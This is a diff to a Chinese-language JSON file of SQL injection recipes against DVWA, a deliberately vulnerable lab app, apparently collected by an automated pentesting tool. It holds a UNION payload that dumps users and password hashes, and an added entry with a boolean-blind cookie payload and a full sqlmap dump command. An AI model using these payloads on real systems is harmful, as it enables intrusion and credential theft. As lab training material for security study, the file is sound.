@@ -20,5 +20,12 @@
     "reference_payload": "id=1' AND 1=2 UNION SELECT GROUP_CONCAT(user SEPARATOR '|'), GROUP_CONCAT(password SEPARATOR '|') FROM users-- -  (POST 到 session-input.php，再 GET /vulnerabilities/sqli/)",
     "principle": "AND 1=2 消除原行使 UNION 行占 LIMIT 1 名额 + GROUP_CONCAT 合并多行为单行，绕过 LIMIT 1 拖出 users 全表（5用户+MD5 hash）",
     "source": "dvwa"
+  },
+  {
+    "id": "auto-20261030140545",
+    "context": "DVWA SQLi Blind high：输入在 Cookie id（$_COOKIE['id']），查询 SELECT first_name,last_name FROM users WHERE user_id='$id' LIMIT 1；无数据回显，只有布尔 oracle：存在行→'User ID exists in the database.'(200)，否则 'User ID is MISSING' + 404 + 随机 sleep(2-4)。用 sqlmap 对 Cookie id 标记注入点（id=1*），--technique=B 布尔盲注。payload: id=1' AND 7171=7171 AND 'MXrC'='MXrC。取出 current-db=dvwa，并布尔盲注拖出 users.user（1337/admin 等，表内 5 行）。",
+    "reference_payload": "Cookie: id=1' AND 7171=7171 AND 'MXrC'='MXrC  (sqlmap -u .../sqli_blind/ --cookie \"id=1*\" --technique=B -D dvwa -T users -C user --dump)",
+    "principle": "布尔盲注：无回显，用查询条件真/假对应页面 exists(200) vs MISSING(404) 差异逐位推断数据；Cookie 中 id 参数拼接注入",
+    "source": "dvwa"
   }
 ]
